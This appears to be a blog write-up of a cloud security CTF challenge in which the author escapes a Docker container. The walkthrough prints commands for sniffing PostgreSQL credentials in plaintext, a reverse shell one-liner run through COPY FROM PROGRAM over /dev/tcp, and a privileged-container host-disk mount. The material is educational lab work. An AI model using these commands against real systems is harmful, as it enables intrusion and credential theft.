---
layout: post
title: "Wiz Cloud Security CTF — Challenge 2: Contain Me If You Can"
description: "After bit of a break, I finally completed my second write-up for [Wiz’s cloud security CTF](https://cloudsecuritychampionship.com). If you have not read my first post for this CTF, [check it out here](https://medium.com/@CyberSpooon/wiz-cloud-security-championship-ctf-challenge-1-perimeter-leak-33ca16f58b86)!"
date: 2025-12-06
# image_base: /assets/images/posts/2025-04-01-Operation-Get-Ricked
tags: ["CTF", "Cloud", "Hacking"]
---
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FKsIBg7uHoJhKEHTZ9_v1A.png)

Challenge 2: Contain Me If You Can
----------------------------------

You’ve found yourself in a containerized environment.

To get the flag, you must move laterally and escape your container. Can you do it?

The flag is placed at /flag on the host’s file system.

Good luck!

Enumeration
-----------

In this challenge we spawn into a docker container with the flag located somewhere on the container’s host. My initial enumeration was pretty basic starting with a tool called [deepce](https://github.com/stealthcopter/deepce) by [@stealthcopter](https://github.com/stealthcopter) which is a container enumeration and exploit tool. The output of this tool shows that we are running as root within a docker environment. Other than that we don’t see anything incredibly useful from its output.

![Deepce output](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wA7PPedxfkdB0Oj57nDG6A.png)

The creator of the challenge notes that _“This challenge is heavily inspired by a real-life research project our team blogged about…”_ so I begin hunting for container escape related blogs posted by the Wiz team. After finding few relevant resources, I decided to use the first hint. Hint one:

> Can you spot any interesting established network connections?

Clearly I should have been more thorough in my initial enumeration but running `netstat -na` shows us that the container is connected to a PostgreSQL database on default port 5432.

![Netstat output](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M383AjARSw0AMSX8b7oW6g.png)

Pulling the PostgreSQL thread, I found this [blog by Wiz](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) discussing common misconfigurations and vulnerabilities often found in PostgreSQL environments. In summary, there are different “flavors” of PostgreSQL that have been modified and deployed in various cloud platforms (Azure, GCP, etc.) as DBaaS. Each “flavor” can have unique vulnerabilities associated with their unique implementations. Further tinkering with network traffic reveals that the network connection to the PostgreSQL database is unencrypted as we can see the `SELECT now();` command in tcpdump data.

![SELECT now(); command seen in plain text.](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NX4wkR4OO9MOKJWM0u-MOw.png)

Unencrypted traffic and a word from today’s sponsor… NordVPN!
-------------------------------------------------------------

At a roadblock again, I reluctantly used another hint which did not provide us with new information. Hint two:

> This network connection is plain-text. Can you think of a way to take advantage of it?

A third hint reveals information already discussed in the PostgreSQL Wiz blog. This is a functionality built-in to PostgreSQL but it is not applicable until we can find some way to authenticate to the PostgreSQL database and run queries. Hint three:

> `COPY... FROM PROGRAM` can be used to execute arbitrary code in PostgreSQL.

After a lot of trial and error, I discovered that I could force the existing PostgreSQL connection to re-authenticate by killing the connection (`tcpkill -i eth0 port 5432`) and quickly running tcpdump (`tcpdump -i eth0 -A port 5432`) to capture credentials in plaintext:

![Creds from the re-established connection shown in plaintext.](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QsAj8fgEoZpv3yZsDJnnoA.png)

Armed with a user/pass for the `mydatabase` database, we can now authenticate to it and run PostgreSQL commands.

![Successful connection to “mydatabase” + switching databases](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pyQoKE8lzFU65wkIZFMymQ.png)

This is a great opportunity to use `COPY ... FROM PROGRAM` to set up a reverse shell and establish a stronger foothold on the machine hosting the PostgreSQL database. The tricky part is that we only have one command window to work with so I found a tool called tmux that lets you manage multiple terminal sessions inside a single terminal window. I put together a basic reverse shell that starts in another tmux window and connects to the PostgreSQL machine which is just _another_ container.

```
apt-get update && apt install tmux -y
tmux new -d -s netcat-listener 'nc -lvvp 4444'
tmux new -d -s start-shell "psql postgresql://user:SecretPostgreSQLPassword@172.19.0.2:5432/mydatabase -c \\"CREATE TABLE rev_shell (data text); COPY rev_shell FROM program '/bin/bash -c \\\\\\"bash -i >& /dev/tcp/172.19.0.3/4444 0>&1\\\\\\"';\\""
tmux attach -t netcat-listeners
```![Successful reverse shell and conveniently we have root](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cn4MU51zFPc-_eI1AUQTNQ.png)

“One often meets his destiny on the road he takes to avoid it.” - Master Oogway
-------------------------------------------------------------------------------

After more unfruitful research on container escapes, I used the final two hints to hopefully point me in the right direction. Hint four:

> The PostgreSQL administrator of this environment needed a really easy and convenient way to become root for maintenance purposes.

(We already know about root privileges from our basic enumeration when we first established the reverse shell). Hint five:

> The `core_pattern` file in procfs is often used to perform a container escape.

The final hint was much more interesting. Doing more research led me to the Linux core man page which states:

> The default action of certain signals is to cause a process to terminate and produce a core dump file, a file containing an image of the process’s memory at the time of termination. This image can be used in a debugger (e.g., gdb(1)) to inspect the state of the program at the time that it terminated.
> 
> Since Linux 2.6.19, Linux supports an alternate syntax for the `/proc/sys/kernel/core_pattern` file. If the first character of this file is a pipe symbol (|), then the remainder of the line is interpreted as the command-line for a user-space program (or script) that is to be executed.

Essentially, if we append a pipe symbol and an executable file path at the end of `/proc/sys/kernel/core_pattern`, it will run the executable if a core dump is created via a crash. This great [blog by Jordy Zomer](https://pwning.systems/posts/escaping-containers-for-fun) details how we can use this functionality to get code exec on the underlying container host with another reverse shell. I also discovered this awesome tool and resource called [KubeHound](https://kubehound.io) by DataDog. KubeHound graphs attack paths within Kubernetes clusters but what I found most useful was their [Attack Reference](https://kubehound.io/reference/attacks) matrix. It lists many different Kubernetes attack techniques including the container escape using `core_pattern`. I spent a while learning and modifying this particular method but was unable to get it to work. At the time, I believed my issue was how I was triggering the crash. KubeHound and Jordy’s blog both use an intentionally broken C program to create the crash. However, due to disk space constraints on the container (_or so I thought_), I needed to use native bash scripting to force a crash which I could not get working. (See the edit at the end if you would like to read about my blunder).

After abandoning the `core_pattern` escape method in lieu of another, I found an even easier solution in KubeHound’s attack matrix: [CE_PRIV_MOUNT](https://kubehound.io/reference/attacks/CE_PRIV_MOUNT). Basically, if a container is privileged, you can mount the host machine’s disk to the container with read/write privileges by running the following commands:

`sudo mkdir -p /mnt/hostfs`

`sudo mount /dev/vda /mnt/hostfs`

While this is much more boring than doing reverse shell-ception, it gets the job done. After the host’s disk is mounted to the container, we can cat the flag to solve the challenge!

`cat /mnt/hostfs/flag`

Edit: Fail compilation
----------------------

In order to perform the _exact_ `core_pattern` escape detailed in Jordy’s blog, I needed to install the necessary dependencies to build and compile C programs. My initial google-ing told me that the `build-base` alpine package contained all of the dependencies needed. While true, the package took up what little remaining disk space I had on the container. It wasn’t until after solving the CTF that I went back and realized I do not need the entire suite of build-base tools and instead only need `gcc` and `musl-dev` to compile binaries in C.

```
032c93ff87db:~/data$ df _-h
Fi_lesystem                Size      Used Available Use% Mounted on
overlay                 973.4M    700.1M    206.1M  77% /
tmpfs                    64.0M         0     64.0M   0% /dev
shm                      64.0M      1.0M     63.0M   2% /dev/shm
/dev/vdb                973.4M    700.1M    206.1M  77% /etc/resolv.conf
/dev/vdb                973.4M    700.1M    206.1M  77% /etc/hostname
/dev/vdb                973.4M    700.1M    206.1M  77% /etc/hosts
/dev/vdb                973.4M    700.1M    206.1M  77% /var/lib/postgresql/data
032c93ff87db:~/data$ sudo apk add build-base
032c93ff87db:~/data$ df -h
df -h
Filesystem                Size      Used Available Use% Mounted on
overlay                 973.4M    940.7M         0 100% /
tmpfs                    64.0M         0     64.0M   0% /dev
shm                      64.0M      1.0M     63.0M   2% /dev/shm
/dev/vdb                973.4M    940.7M         0 100% /etc/resolv.conf
/dev/vdb                973.4M    940.7M         0 100% /etc/hostname
/dev/vdb                973.4M    940.7M         0 100% /etc/hosts
/dev/vdb                973.4M    940.7M         0 100% /var/lib/postgresql/data
032c93ff87db:~/data$ echo bingbong > bingbong.txt
echo bingbong > bingbong.txt
bash: echo: write error: No space left on device
```

As always, thanks so much for taking the time to read my blog. See you in the next one! :)